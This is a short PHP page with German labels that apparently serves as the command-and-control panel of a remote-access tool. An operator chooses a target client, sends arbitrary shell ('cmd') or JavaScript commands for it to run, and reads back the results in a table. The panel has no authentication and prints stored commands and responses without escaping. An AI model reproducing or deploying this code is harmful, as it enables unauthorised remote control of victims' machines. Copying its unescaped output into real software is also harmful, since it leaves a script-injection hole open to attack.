<?php



 if(isset($_POST['addCommand'])){
   $commands = json_decode(file_get_contents("commands"),true);
   $newId = round(microtime(true)*1000);
   $commands[$newId] = array(
        "id" => $newId,
        "type" => $_POST['type'],
        "data" => $_POST['data'],
        "clientId" => $_POST['targetUid'],
        "started" => 0,
        "sucessful" => 0,
        "response" => ""
   );
   	file_put_contents("commands", json_encode($commands));

 }

if(isset($_POST['clearCommands'])){
	file_put_contents("commands", json_encode(array()));
}

?>
<input type="button" onclick="location.href='index2.php';" value="Zur neuen Seite" />
<h2>
  Commands
</h2>
<p>
  Hier kann man dan Commands adden....
</p>
<p>
  Es geht bis zu 15 Sekunden bis ein Command vom Ziel ausgeführt wurde... Bitte lade die Seite ein paar mal neu
</p>
<form method="post">
  <input type="hidden" name="addCommand" />
Ziel:	<select name="targetUid">
		<?php
		
	  include "cache.php";
$c = new Cache();

  $clients = $c->retrieveAll();
	
		foreach($clients as $id => $client){
			echo '<option value="'.$id.'">'.$client['clientLabel'].'</option>';
		}
		
		?>
	</select><br />
Befehltyp: <select name="type"><option value="cmd">cmd</option><option value="js">js</option></select>
Befehl: <input name="data" />
<input type="submit" />
  
</form>
<form method="POST">
	<input name="clearCommands" type="submit" value="Befehlsverlauf löschen">
</form>
<table  style="width: 100%;" border=1 frame=hsides rules=rows>
  <tr>
    <th>Command_Id</th>
    <th>Target</th>
    <th>type</th>
    <th>command</th>
    <th>started</th>
    <th>sucessful</th>
    <th>response</th>
  </tr>
  <?php
  
    $commands = json_decode(file_get_contents("commands"), true);
  
  foreach($commands as $c){
    echo "<tr><td>$c[id]</td>
    <td>$c[clientId]</td>
    <td>$c[type]</td>
    <td>$c[data]</td>
    <td>$c[started]</td>
    <td>$c[sucessful]</td>
    <td>".nl2br($c[response])."</td></tr>";
    
  }
  
  ?>
</table>
